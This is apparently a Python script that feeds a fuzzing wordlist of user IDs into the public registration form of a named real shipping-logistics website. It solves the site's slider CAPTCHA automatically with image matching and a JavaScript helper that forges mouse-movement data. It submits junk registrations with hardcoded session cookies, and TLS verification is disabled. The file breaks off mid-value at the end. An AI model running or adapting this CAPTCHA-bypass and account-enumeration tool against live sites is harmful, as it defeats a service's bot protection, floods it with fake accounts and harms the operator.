import base64
import json
import time

import cchardet as cchardet
import ddddocr
import js2py
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def do():
    id_list = []
    with open('../fuzz/qrcodeLen10.txt', 'r') as file:
        for line in file:
            # 去除行尾的换行符并添加到列表中
            id_list.append(line.rstrip('\n'))
    success_num = 0
    ocr = ddddocr.DdddOcr(det=False, ocr=False, show_ad=False)
    for id in id_list:
        headers1 = {
            "Host": "cs-captcha-public.cargosmart.com",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Cookie": "BIGipServerpool_wildcard.c2.pd.k8s_31380=522378250.38010.0000",
            "Referer": "https://www.cargosmart.com/",
            "Sec-Fetch-Dest": "script",
            "Sec-Fetch-Mode": "no-cors",
            "Sec-Fetch-Site": "same-site",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
            "dnt": "1",
            "sec-ch-ua": '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-gpc": "1",
        }
        url1 = 'https://cs-captcha-public.cargosmart.com/captcha/public/get' \
               '?appKey=d47a26d9d6e647b5a4429f81ca878ff8' \
               '&captchaType=blockPuzzle' \
               '&sessionKey=1a29e086-0796-49f9-a072-9b41bad6615a' \
               '&jsonpCallback=xxx'
        r1 = requests.get(url=url1, timeout=5, verify=False, headers=headers1)
        res_encoding = r1.encoding
        con_encoding = cchardet.detect(r1.content)['encoding']
        text1 = r1.text.encode(res_encoding).decode(con_encoding)
        # print(text1)
        # break
        data1 = json.loads(text1[4:-2])
        # print(data1)
        # break
        # 将字符串里的+替换为%2B
        token = data1['repData']['token'].replace("+", "%2B")
        # print("token:" + token)
        # break
        if len(token) < 60:
            print("需要验证滑块!")
            secret_key = data1['repData']['secretKey']
            original_image_base64 = data1['repData']['originalImageBase64']
            jigsaw_image_base64 = data1['repData']['jigsawImageBase64']
            img_xy = ocr.slide_match(base64.b64decode(jigsaw_image_base64), base64.b64decode(original_image_base64),
                                     simple_target=True)
            # print(img_xy)
            move_left_distance = img_xy['target'][0]
            aim_at_recapt = open('./js/aimAtreCAPT.js', 'r', encoding='UTF-8').read()
            context = js2py.EvalJs()
            context.execute(aim_at_recapt)
            point_json = context.getpointJson(secret_key, move_left_distance)
            # print("pointJson:" + point_json)
            mouse_point = context.getmousePoint(secret_key, move_left_distance)
            # print("getmousePoint:" + mouse_point)
            headers3 = {
                "Host": "cs-captcha-public.cargosmart.com",
                "Accept": "*/*",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "zh-CN,zh;q=0.9",
                "Content-Length": "3219",
                "Content-Type": "application/json;charset=UTF-8",
                "Cookie": "BIGipServerpool_wildcard.c2.pd.k8s_31380=522378250.38010.0000",
                "Origin": "https://www.cargosmart.com",
                "Referer": "https://www.cargosmart.com/",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-site",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
                "dnt": "1",
                "sec-ch-ua": '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "sec-gpc": "1",
            }
            check_body = '{"captchaType":"blockPuzzle","pointJson":"' + point_json + '","token":"' + token + '","sessionKey":"44c4c9f1-8b2f-40b8-9864-e37bdae06799","mousePoint":"' + mouse_point + '","startTime":1686900090336,"endTime":1686900090700,"manualMovementMousePoint":"lb9XTKNC1o4Ws8uLH0Ib6RN4p1d3VvveB3xLV6TJsk5h5w1N14judo7Q50n8AuxE"}'
            url3 = "https://cs-captcha-public.cargosmart.com/captcha/public/check?appKey=d47a26d9d6e647b5a4429f81ca878ff8"
            r3 = requests.post(url=url3, data=check_body, headers=headers3, timeout=5, verify=False)
            if 'token' in r3.text:
                data3 = json.loads(r3.text)
                token = data3['repData']['token'].replace("+", "%2B")
                print('获取新的token成功：' + token)
            else:
                print('获取新的token失败！')
                continue

        headers2 = {
            "Host": "www.cargosmart.com",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Cache-Control": "max-age=0",
            "Content-Length": "15849",
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": "cscaptachaCookie=d7fac5db-2d3f-4473-80ce-afa03844dffc; JSESSIONID=2S-8v5Mil6z9P8qeIoobTu6GQ7vPBjG1xKGBj4hogsF4uMyOaRnK!-421576788; acceptanceUserId=_qm2alx42c8s3xavs9nsxv4; csCookiePolicy=Accepted; django_language=en-us; WT_FPC=id=2f3aa074ed9a1ace0ec1680624088224:lv=1686793851196:ss=1686793851196; BIGipServerpool_www_8001=2022663115.16671.0000",
            "Origin": "https://www.cargosmart.com",
            "Referer": "https://www.cargosmart.com/admin/registration/pub_register.jsf?ANONYMOUS_BEHAVIOR=BUILD_UP&PREFER_LANGUAGE=en-US",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
            "sec-ch-ua": '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-gpc": "1",
        }
        email = '3024055182%40qq.com'
        sms_body = 'form%3AerrorCode=&form%3Aul_sign_in_1_language=&form%3Aul_sign_in_1_country=&form%3Aul_sign_in_1_continueUrl=&form%3AfromEntry=&form%3AfromEntryType=&skipBrowserCheck=&updateZoneInfo=false&ENTRY=MCC&ENTRY_TYPE=STANDARD&form%3AcsCaptchaToken=' + token + '&form%3ApreferLanguageHidden=en-US&form%3AcpInfoCompanyName=TEST&form%3AselectCompanyTypeHiddenField=3PL&form%3AcpInfoStreet1=TEST&form%3AcpInfoStreet2=&form%3AcpInfoStreet3=&form%3AcpInfoCity=USA&form%3AcpInfoCounty=&form%3AcpInfoState=&form%3Aselected_option_cpInfoCountry=KH&form%3AcpInfoPostalCode=&form%3Acontact_userID=' + id + '&form%3Acontact_first_name=abc&form%3Acontact_last_name=abc&form%3Acontact_email=' + email + '&form%3Acontact_phone_countryCode=138&form%3Acontact_phone_areaCode=88888&form%3Acontact_phone_localCode=888&__selTimeZoneInfocontactTimeZone=111&form%3A__selectedTimeZoneInfocontactTimeZone=111&form%3Acontact_department_sel=&form%3Acontact_other_department=&form%3Acontact_title_sel=&form%3Acontact_other_title=&company_adm=on&form%3AadminUserHidden=true&form%3Aadmin_userID=&form%3Aadmin_first_name=&form%3Aadmin_last_name=&form%3Aadmin_email=&form%3Aadmin_phone_countryCode=&form%3Aadmin_phone_areaCode=&form%3Aadmin_phone_localCode=&__selTimeZoneInfoadminTimeZone=111&form%3A__selectedTimeZoneInfoadminTimeZone=111&form%3Aadmin_department_sel=&form%3Aadmin_other_department=&form%3Aadmin_title_sel=&form%3Aadmin_other_title=&form%3AreceiveUpdateAndOffer=true&form%3A_id1098%3AselectedValue=&form%3A_id1098%3AunselectedValue=%3C0%3E%3C1%3E%3C2%3E55%3C3%3EACL%3C0%3E%3C1%3E%3C2%3E26%3C3%3EANL%3C0%3E%3C1%3E%3C2%3E12%3C3%3EAPL%3C0%3E%3C1%3E%3C2%3E25%3C3%3EAlianca%3C0%3E%3C1%3E%3C2%3E306072%3C3%3ECCNI%3C0%3E%3C1%3E%3C2%3E7%3C3%3ECMA-CGM%3C0%3E%3C1%3E%3C2%3E65%3C3%3ECNC%3C0%3E%3C1%3E%3C2%3E5%3C3%3ECOSCO+SHIPPING+Lines%3C0%3E%3C1%3E%3C2%3E90%3C3%3ECrowley%3C0%3E%3C1%3E%3C2%3E56%3C3%3EEvergreen+Line%3C0%3E%3C1%3E%3C2%3E53%3C3%3EGEEST%3C0%3E%3C1%3E%3C2%3E306075%3C3%3EGold+Star+Line%3C0%3E%3C1%3E%3C2%3E4%3C3%3EHamburgSud%3C0%3E%3C1%3E%3C2%3E2%3C3%3EHapag-Lloyd%3C0%3E%3C1%3E%3C2%3E17%3C3%3EHyundai%3C0%3E%3C1%3E%3C2%3E160%3C3%3EICL%3C0%3E%3C1%3E%3C2%3E61%3C3%3EKMTC%3C0%3E%3C1%3E%3C2%3E57%3C3%3EMATSON%3C0%3E%3C1%3E%3C2%3E71%3C3%3EMCC%3C0%3E%3C1%3E%3C2%3E58%3C3%3EMEIKO%3C0%3E%3C1%3E%3C2%3E21%3C3%3EMSC%3C0%3E%3C1%3E%3C2%3E16%3C3%3EMaersk%3C0%3E%3C1%3E%3C2%3E306077%3C3%3EONE%3C0%3E%3C1%3E%3C2%3E1%3C3%3EOOCL%3C0%3E%3C1%3E%3C2%3E44%3C3%3EPIL%3C0%3E%3C1%3E%3C2%3E46%3C3%3ESafmarine%3C0%3E%3C1%3E%3C2%3E306064%3C3%3ESeaLand%3C0%3E%3C1%3E%3C2%3E91%3C3%3ESeaboard+Marine%3C0%3E%3C1%3E%3C2%3E87%3C3%3ESeago%3C0%3E%3C1%3E%3C2%3E73%3C3%3ETricon%3C0%3E%3C1%3E%3C2%3E121%3C3%3ETropical+Shipping%3C0%3E%3C1%3E%3C2%3E306073%3C3%3ETurkon%3C0%3E%3C1%3E%3C2%3E22%3C3%3EUnited+Arab%3C0%3E%3C1%3E%3C2%3E23%3C3%3EWan+Hai%3C0%3E%3C1%3E%3C2%3E118%3C3%3EWestwood%3C0%3E%3C1%3E%3C2%3E14%3C3%3EYang+Ming%3C0%3E%3C1%3E%3C2%3E24%3C3%3EZim+Lines&form%3AteuSelectionHidden=&form%3AcompanyWebSite=http%3A%2F%2F&form%3AselectSegmentHiddenField=&form%3AcrossDomainSaveStateMapString=&form_SUBMIT=1&ANONYMOUS_BEHAVIOR=BUILD_UP&form%3A_link_hidden_=form%3ApubRegistrationSubmitCommandButton&jsf_tree_64=1HdYiTH%2BP6Yzs73gwjzlZgq9zSiKpL2jkH%2FHlIbft0OWsq%2FkaRXX8YaqI6bqPvVI0Ye99dnGPpItrYjGbRWZIdP%2Bnmy73JJt37Tz7wo8ZxupEHGWFo4fpZKqDOj7GWEsoE1Y601qo91sIpdsoS9eREr7CwI2GTKaEvVNQIosaydD8jbFgWSz5Ewqutk4LE75hT%2FUIo9RinTw%2BP7t2cbfu3H6YfIQLRoV9h5BDeql%2F3QvIg6BOls1q%2BoVm6%2FWjJm3m%2BGQiEg%2BIUY6zJsQPM6qzppQhTt6isr%2B992OrIxNBQJJt7k3pZrlPMnn1VaNc3eJ5Y%2FY0Wh8foBlaMwA1Ui9Dewxvu%2FVYe4lDMsvRwr%2FcRsyuWYA5SOhclDCWqSY57RyRu%2BcnVNoqfpVr5KsLdIkcdvY%2B1v6rBmMmx%2FxP670q6QR957frP%2F3eLzpE6Ql8P%2BwMaK%2BKe%2BiiD6s3WPTtaYpux7Z0t825cy%2BtC0fjg8VN30U2It%2F55kZCKYDsayE3MC6e%2Fv4TClfo4SGGhlAEOBJ%2BaWqcofaPvrgkxbQAlwFhAvWz8BMG3XTBSJtnZn%2FRg3AG%2F7EMrD3mwBautiyfP5eQPQLNffqGfpvJPhh2ajaV6UZLKg5m7vfJpYWZec4msGLJdIw9d9NXaMeC35JiwBLqUrk0r0LISClScCE%2F%2FdTGs7xTo5Y52fd8FUqcOFS%2FOGW8bsZ6hvqctxb3Zu6FY0%2B%2BzmKC1vN4OmKr%2Bhhbmezs%2B6z7tdJoe5z34nhgMhetGDLXeMJtE%2BHBtbHi4AN1pY2cSYzsKqvsnClKbie6KG1GR6g3QKLHPlERstkYzzyy3GuhZcoYgZgyYs%2FpbGetuhpo277b4sAZ9gHf%2F656PcGK8IR042blv%2FPpzgXPUv%2FDplFZqzBlY55Cut9smzaD9D0RnpD9yiKsVIuLiYJlPcq5GPrvUB%2FGZgZL8eSTtflcMLvL%2B0AbFD0KcJd94gX2cRg1P69iu2EtbRlCMvY7J%2BiBm2P4NB0kHfnM89hTXN%2BQHo33Lumg8qJVpZZ3mTlm9HztfpX5gWJVfpLg9Gos5xOlRLoFgx5IsBPS1bHcStiuQdgD4lZkkmuaPxqw%2FJ5o3%2BWtHi6t%2Btxf1F9loAKw6VL%2FGLZPKf9u0ofXD2q3PKIlCZ6p61EYwnymvicNlM7PFjGxcY0ck9DZeqzSvM8whNN3IyznSgEQiCQpdHuGGu%2BiU4jC86jBNd%2Fpk881n%2BVp70ulKxasn9WXmka7ntagAzWHHTENCge2If6XT%2FTJul%2BQlRquujxdn7PK3Q5AlL%2B24k9qpijcZ0Qs8f6Z0Jb9Jl6FweWXUR20yRbV57yCs35u1KKQOfnSHn05xfyoeUt2NoLv0iSwa2adfigLhOpBS7dvxPb%2FFTghDAnwvE9QkTWKqtDM3tYcJ67wBl4ymk1zkedFYBIb8psBWtCafiAEU6lWDnNKvT4b9YyJk95TPfGAw1GHYa23JoYhIRpik8Ibsa4lG1ppy%2FdZMo6H%2BCy1VlpRefQEvXOdQtnWhBPmUDAlvU%2F6srUTBEiKh3RbO8Y7edBtV%2Bio718D91CJMaKCQuPLCxs5f5yUzDD6JwJJ6mGQwfcrsztNc9OXdng%2FYrFR9b9Ta45LBuLYTiIdluMFfcUy9M%2BxNx44C4ySw%3D%3D&jsf_state_64=1HdYiTH%2BP6a%2BcgKDp4GnqpvLmBJ3vQF6i3LfsdwqMGjSqNmiA2BfY%2B%2FtGG0eIWa5Y9BakpKvLaBLdRQPnwOEGj%2B4SXUV9QJzwB691O%2B%2B2knjTr%2BqmCgBvAbQaQUic1mUjyTrl9EeS4MMBXfJ5hcpjDSktVKja5LK7O9fpwGT7YtsnrdBe4rf1iWZbVKQlPtiyTzDCtv%2FCffbJs6UeQ1d3Xd%2Ba0FzsTrQEBLTaXkTNjAL1HlhvqRy1Qky1EIgkB5NSrgvumDTuWL1OyWOSO6Ep9dQi1KaalSNeEV6IYTJt527ABG2iP3lh6pZFxQ%2BKDxXt%2BBEpNR2udgQKlcr4e6%2BLFQ9YkrtUUW9SHK8RZCLmv0cjQWbdEpNwcFwMBH%2BlbBxPCNWtnOmHNW7suNWUHY9omShC6wXHxGCnNAXoW%2BsgbzF%2FDxbKz824HvJmQD%2BhQO9HRRAUrVVdsSeehNNOkAHdsJDhHORFmsax44XDzO9DX1tCF3lTuDWuDeQKiE0pQp7Uf1KM9Z%2BWWLPjtO10yHVnNEhEqmeDcWmhHF1GiTYk4ivXGMg8%2BOM5uisYdovUKfBswYI2blybt98Bg2z6R%2Fqp1IlPaU%2FG7ee%2BodUrTfc8R7AgF%2Fg8G%2B9d%2FAJdbehM%2F6jF3QPlQbYDAvtVpzAm9DJqqEhcmf4by%2F2F8%2B9M1nBVqYfm0GrTIF0H9kHW%2BuJCSUDIsnLWemPh14zvoAbqNJHnI3r4%2Bqby6ottNoACbJVl4TlE8hJ%2FLTekphXK%2FJl65M%2FsU041xvJ1TmupJu0gHdr5ggJjCH38LdSmWS%2FYBK5kZSTDpaTVfWcnx%2BHq7WJo8u5c3lDEdmylPrQrYabiN1mCtgUKoV2Fx0DjBVyJu0WzKJi1ollxBRp9LB7lFVVC8APN75ITiE30IFjkd9A%2F9clV3pF7tcZUzgTsoDKs3n0YeqFUT72kQnheRFvL18ITzmS5LlobV263bbeo2klwrNXoxxNYYFUVBYsDFKO0Hd%2BhJ5mkfBTVpq520ffhhjbViUslM1DrIr44qn0PgzY447cqQkesb5L%2BBNuXuoroAbyEZR5HNdGAsHoqXpU0gTGeYtAZ07ecqdy4lGOiSZ9sbt%2FdM7nHvIzUSQXPJbIrbUUOn08Hb4KJF2zVII2UppZhc6zp56hY%2Bn418CVfXwDemB0jDGUqSdk3IibOLPyDyn%2BhMArnIQJoEud2CRo6u4lvmbGmBzFoziSqJs45c0F0DqaFDMa1JppeEVAIYOs%2FB%2B6Htiy8%2BP6sid%2BPsyl71GPArQz2ZkoyMVjANWeb22xaULQJ26NMDAd5%2By3pV2RDq2LMX6UR1y3z2EFCi9KLpH9OFHY7XYS2KPiNfSohfcBKkxpqYrdnP3uVAuPazft%2FA7tHqtaXqlhVqcB%2FDNqHjvhKNoApfbzCJA7ezSXjpzH4im%2FxZu965hC4WBZsqK8ln8jKB6BiOw7qaWwy%2FSdMoSpjg32c%2FcivXLmtfTrSusj1i2cBTRk12kjeiGm%2Ff5BomZW3WwKQuo896Sly083PhW65aIwqxxT%2FVx0VTndrbmgTAzYaNn9dBIbapIg2gKPoDjMLmviHEavLNJHi1dMh2bJvVOYxVofRkzM68xYbnRAz8Byji%2BuddPSo29iukAy2ZfItHlhlokyRAdQJ03Wqs9t1a%2FMIcokI0CTUYLGtWsXNh%2BMwK%2FubQ5hNztlwv%2B0C8reSG1f2Idb0susLNix62AjPzow9OHuuQOQIonmJTnsdT2orm9rMEa3sfHXbRZCSz3%2FocYO4%2BGjAlg1v4g8DPudLlXpef%2F%2BL80GtqHH7chZIX3aeZYiW1Yl%2FotkZzDyZY1OPKr6%2BDBTd7V0IiLFQL2GrPgqyoo%2F9EaNwx6ZjZyPaxrt%2FBKHppFcczlE8cYKHhhqF4vfJ%2BAoo7FGX8h52nihTxaiws%2B67uIV4t%2FhKTgaW2imdJe2ADxPDzoY7JOz6dfKfOyxWCpw3RHpgcgMNd3qKSRJIC6GuEGvR%2F0GfTffsN6BRggE%2BXD9Lifikv4t5eCmd%2BcmKOylaZAnwZIOoAPM%2FGlgWQVQs%2BRyQdCWOPH5AF6SCDWXYopG%2FBXcuQzk3Ed91OUBtFbemJJoPRgvMdJarGAcAJ0KvgugjjxO5NMhKAtQh1vCLVtXIdL5%2F%2Bg%2FuVC8ffWjSprrqipiiXARkvuyamgquF1ghMEyTO%2BLuOVhokjRlyJznY3jzLqtiUgNPiVZ%2B8QqkMIKGkzdhegqvsrQ1WifwDJnCP21TlkNIAXaNVT5NiOC%2BF8kCyubsEf%2Fsh%2F5vy7a1lbLvuaPc%2BSXhl0ZerEw5D9Gv6FPWCAArtgUP9KFyNUdOTtpwB9UAr6DzlZBg8IyJR3GHf38UnW3eZSsW2iKqovd2OHxNPBC2I2FGuNB1DI1Jz3qe8mqpeOI0YcU0nOJpPR7racKFUG58ZLolL8WAb6GsITJZHKN%2Bigz1Vp7RAXQZ4mUocLYV5zOoTE1UCloWXlmD9WfS7K85ctj5nqCNHTiJ76Gub51ob7wkjPm0AKWcgng5E9wek6%2B39H8WX2NJunljQY0Il0ymJeIxjmmSQVhpYXNcP9XqD%2Bz%2F5RWsiPIJ7Re3i2HMB5PBf5kJWqkapOO5GzYXePE27qj1b7dUF4c1xwjRuekfWlzOvZi65kjG0x1lry1vx%2FKwT7mZhiMWukpYSKmFViKHx6DARbVLWHTcjra%2BjXh8zDAq2lmdtwU7%2FmBrpPo2mkCuMLPMbMIF5Ia%2F7lJdkPwshHXgFZZAuDjjEKXopcSGnN2I5RjIn1KXSH5hekbFd6Pa1ex%2B8PEFA9mX%2Fg0I77m46uzTXjTb2RbaNQ6qHerW8NAWHRVavcqrUiO95rw5bgmqVzOvytRwjegWffKc2IpxRb1s4zeUHXz29rhHEXCU0%2FUVRbrE8V5cyIsd%2FIfC54vReLdt2PEEK7hqbrcSuGWRnIbNR5%2BZNTAHvFjC90Rch9zH7A9MJ16KQV1SSbvITRFcq9qerV4o5Gdi9J3n1JueRJuqQItKXLJzdKRxt5OFg4HQ2qo02qhqLRdPinta1e4hF0pJM5MgC%2BHCY1g5bjq5vNJf4Cvn2keDAA6D8wsQ5f7hi%2FdYoz1hX9zEdpoSLz6Ys0x1LSuTJqMkqSrw5avkOrNSJM6GxP%2BOt%2FZhnakjepDTLeliXxXu9NJuBgxisQ93S7kqfnenrK0x5OiX2%2FjXVLpMuRDLqmEBgxgsx5wsEUFXSBFEvBzwDEII%2Fj691qOJTUlPGy3tTSDWecU2PTbbCCdOMJXDOcGq8tQ9qhQUPuAuDFGnd3RdV3rifQnKemGoZBN45%2F0fJHTcLNMJr%2BvOk4l8Ttt93klfWy36GGoDJ%2BjMgTfE7NEJKIh26krdxKVd%2BlxWlF6QP34sEJX1%2B23%2BD3XBxEwmBxk88s2pCgPAz%2FkbGgVImJdicNl%2Fc2%2BWXpg00EIHJQDC6cGWYu6e8Z3d9hTvTw3NvZkibUGDQ3vYYTOcQfteXvM23P1Plab7GvgF%2ByTVK1aAxh9iXhKgjmCRNs2VStfRrkIuOXxHgxB79xawf2wUZ37ggPNK1Dl9cluSK0tpPg7B80MBxcJORhhJqYjvM0Ue51U4yQVgFxPi4Ti0RIrzZfU8rHpmxFvJF11G%2F%2BI4EYhH5R%2FS5THDU3pWEffTUj%2FawjG3gQd6ABhooDUS0xl%2Bhicd39x6Sv09y5S1CUOUapGzxgG%2BKpHt%2FXgqrE%2F9HTKZHopLTeyqGKfWDHYv%2BLxoBUBaSMw%2FoD5PS8sJY%2FnEr0RwVPxa0M5ALlgHjOCSwwXOkXToLzy6Mjm3xmwIHkf7OuLUj7OnsnEHKxRFMEnRU%2B9TerwXuwUQ4bsCjGNrE4yhhtIICzDrfXzlhdGxITeyQGO6f%2BUGPnL9J0yH%2BIp%2Bq3XIAJ3Y5odQfk1%2FfpGiJ4Sh00W8UJPHDUiahf6rbdFy5q5mZCr27aL3MxC%2FSVMcNmaGpWJq3xCgiWy59ISVzTTPOH%2FTvtUPJE%2Fl26%2BzWqavouyeQB%2Fq%2B4Bg6kxLIMgPjYhUcg3PtpnPsD1q6cgxr%2Fbw3X1o8YBlFBWkS3JKZWdxovh5nWj6Wm2%2FjootbQ5Yx%2FNj5EK24ZpiEOjp0WVMtEzdF73c0eqMwWNPy1UlZv3bDziayiKdQV78z5FH4BugtDmHWMv6VVjV57zFeSXONEU48QF2Vm7%2BtTADpYkWjCs7FhpbpsSwIJfBo44AlP5sPV43GEny2mQCScXEeDNStxPDsbVMXEHrMCrOcdtTaeZhtToiMRnlSa%2B2AI95m%2BnEQTNr5WPudOXVBcElZSp4LsxvM8W5fQJFWc15pan9AvrbMxQtQeTzrqy4ERUJMLknFQzenpCSUjxjyt64Bkv1rDnf11uVLk8Pel9%2BoKCJnk21d9h7P1dcSZv1RALv11AZx57bEs9sDKl40ft9L9ntfU9z3XiYsb11vhqTIcTE7COQZTdudL7DT8yYQ9WwWCKX0CGASl3Y%2FrSNuM0bShXsqOmUd4kbFu3omW46kxzdYM0k8NnGU0jSnbq26MLGSQRXk95pIBOo9nczQOCj%2BA1dpxRSWstjOSh4i7c%2BVNbrCVnWCXyquxgCB3IqKVdEm3hkAWn6cgYKsbMOMoIFsoVQF%2BGB9LVHsla1AdNE40OYVcafS8D%2FsDOBEqQ0bERlo7S8mJtU6QSGQCDILD9omDnYmvIBEMO2zO8wIeh%2Fpo3dhCf5PnR%2FxJ1IcphreHVRvE1xkp6kY2O1XPmLjoRxqx6Kl4HFzUIiqrfI5ZyNhFsGRyWtD9bT6QnohI2OA%2FCifF6mMxR%2FSpXgrZZ9Hw0KERX7S5uGSfJBnSPoA2MVMuh1Nem%2FbS7lJA%2B8%2BzZ%2Fmt2yPeVtsFGoXS9%2BbyaviIdkkfgyztMZmQcGKPbu%2FAkhaWiQkNOOgi1tRS4JgKggmLsKrVP9eCgEiONzuXIliuj27UCxRrtzhcImoi9RxqrVmNjBikfITlofSS%2BLRzQgs%2BSYpFW6PmMJMwPsX30w1qJxO4OE8n2UO87Khm%2B3yazVzzQnIZ1V4VIb2SsZ7Xggesu%2FddUPagV8iWrm9PI3%2BDkDJ%2F0nYbZIXarNRfhTn6D2tx9ds2PQg6Gg53BFkKjhBp%2B5caBsdfU38jf1QetLpSETknKmEJ%2BS8wGFFF3asYFF4JTHKhM1edmoRrpeWcEG0d5GBla4kRiBYzP7SFbo0MXn%2BdlcyoZpxeZc0e86JccdCfaxDsemOgD9Q7W%2FzV1LAxnAuydHf1q%2FPwWq0DtykEQrAQ8cLzXkCi5012k8lXZqjLd08wudHZXvJerezM%2FgoJZ%2Fja3mSr6VaX3g2RSYD%2B3TGvLiGfyjLx5v9JXPiWNKLXomezV3bYuG0Y%2BghmEg54oQu5gbhlN88%2BCV7weAteYxLN82rQffM5B6PTbZ2tYppgAsvPHH9elGfRqhsoqCsyQFFXcFiXCWh2w65j3mhjt3PFy%2F8wIO8cOyTB9XDVWvuJvARmmogOUgolXSeNxZ%2FlcJw8bHCneYR0gFL%2F1wcvG4rTUwDkWr2BmB1yqrB0dCMuGkznQmZRwP%2BHCLR2gqvgAJtGknADykL%2BYGPqGfu6gNupiIOD1oBMYjKcHwA2zIFLAgn5rxl5TqlZbnPd2g9jPqEyUudw0%2BM1adfK6CDvXLIck7xgKFa%2FFYKU4DMqsncoPM8njBb6HRQ7sAKDpjokVmmDIDOHA%2FetcxlyLRk2qWAWQKBhjarRzUmPFQvadIX5Z8Gi73oSwSyHWEOxvEs9pRsJ6HD5lnnTqgI2YKqomC%2Fbm6gZ7zBSahqry3Cqu5RTO8AJzn15aLlVhSl91a5l6Gbh2NbzNL5JhGbATQsgWLXHL837DloEqqVeicfI9uSf1dfMpUUXqt5%2FgbqBBBr5I6TGnlSKeQg4yaVCdTHslExyGxirL2IC1DAjmt5G%2F%2BfA6LaqH4OfUT%2FLif3aWyk0HWd%2F29wxi%2BRSk61NU%2BuZCZ%2FHF5ID7kAKpzGcf45uIqMvPifhE1hMDocDyAd21MeMmwYU%2FBpUnweHYD4RABnHaB4tItl2yUQUbqv%2FQFvQe1rlpq5mVvtWGlNiy5Zduj76qD0H6O8mm9%2FvQtMDij5aLVMV%2FT6ReZ2XrGifVUx6C8cqfB6b4tqnj1sTQQcFLKcNhqNIjRmVpHzhUc8hi7QDR%2Fusq3scXX%2FKA5k766uNggxtBlQsR6C5rYbhdVB6JdGWUOHV0I4CJNEQv4jk4VqP2A29fJ%2B7MPQh%2F%2BJP0yVHqFrsNNUX6SsQ%2FvGk65cK%2BBVPps0CEhVwercPUYfRuGECsseGFXkpDWf61fORv1Co%2BNCVMe84%2BvYi5S3YJ6gS9d0AYseLe8LXu8Sg5J4%2BDbtdwQdsh7X1fTTOghpRcyq3WFZ9jERf8a5hOn7vq7jSK5IXg0ZbT7r1X32MUburB%2BG7T%2FUYuWtHX3ApmxbOfbhUm2E28vwyI%2Fuelzfq1bIq6CZZHr3tPP%2FdTVRGDsohQPzC5VsShVfkEwTLNhmcMiGesLCBLrm9M5DfRtT8SSDbqiDTKsuruy2gSQe3kjH3bPdREvXgmdWE7KkbZRkvirn0LMz8vImCLJj4ZvgNAX%2BVcs%2Bia0Gbf6cKl%2BXLqDps65JjTcFwSHTiRO%2FP9XjgGYUj4UankfQcG01bakJVTspRZLpX%2FRkYyCo9oNnsHo5pRhLamnR0ExHGH8wymVp2lybGVhqAXbXoCr7R5iYHvZEI1Hr7UYZSDVD126eEB6ZTDe3rf1Uv%2FmxRdggCPsZr8SFQT%2FapsNwbhPx0FtwKEGf59vpzKveWCGFrAhoQMVUv9WoCAmfNQ0PHF7xrT0Q%2B0DP5iVu7%2BfXvZuypejv%2FKs44VE1o2a8pFWhVfBo71n5TxlcllK20Fl%2FxGCPPAf64YGWg86anrxJzXeS9zVDuraR4BMwhgTVUCcFyEC0063gg5CT29LPsE10zvvjNWufy7JmNzMKi%2Fnkx5O4AjU8bJ21GGj3riZ8gk6kH6%2FsFYqnkdyWjedHdrqNro6e46jLkFuC1ju4p%2BObSflkD58TzpuzaF18vPepQ4K5yeB%2F3xmkMIRLn0MWSTOBJqkHd9NR7msseIVXjIioCv2QYI1Eflt2XN1%2FW%2BypK4uZ0wl0F45ipDPqhGUGBoP8LfsaPfYlIuBw1TLSl4ojVQiK81CUlaPjYlmMrZMgujS1r%2Bz6Szkok%2B%2BNtsvyZDzfdtaRFYYPSYKGO%2F7kn03cHC50IVFnLjOvMhPagpa8nem%2BQxXxYVmgdArHx3EihNKB9dnGUbQ9X4EGZupXkEoVJW9bcNXk7nR0FB3L%2FmdJHw5mVq06fQ6C7ndrn5QZl8TkWQ3drbYodncUQc15Zh1ipMLowjWdYVn1WG3bvJKEBpV20lIC4CK1Z4FK06gC1cMHaw9WP30U%2BSM4nIUuO99QG1HVi%2Bv%2F%2FEvEL4TIEWeyD%2FyNS5USPdDlLS3l%2BXnKLpRvxKejUEOuREFbQL1aEnA43STKh0CapJSycbLkM6qtUDpqSBBDMzgzfe3bRJH35p0hcF6hWSg9vkw9djjxCI4iQD1yTgRDhj0i4bl5ck%2FbQvBEaD7IgF4w22by6S5DpFkRFf5tmYugyo%2Bz00bW8I%2Bib30QJ%2BXC8lBlrulcE3z4HldB51IqQYEpS%2FTCBBpom56wvMZU7TSUdKrP4zwPrsshEfiANTgySgrcBDk9MkPUvpnOBfpyEmYKu153oFqDWK4nElP2oqqJXC17rwFQ7CDLUOJ0mcMhLheOo3a5%2B1HYlWSETVR7ZZm8nELyZHkggj%2F3bsuZLaK3YJDJ2fQgJjCjkDB0SlmDWzQeT9mH9x0mY5J8WG4X42GnXwW5R8MhuHk9PZ1Wzda9%2BfyFryTWl96aK%2BtqwvqM87jra4SqcrQopPNTJTo4pyuMBZ5W1YtyqmAn13ELL7fq%2FjPaZ5Cwop5O%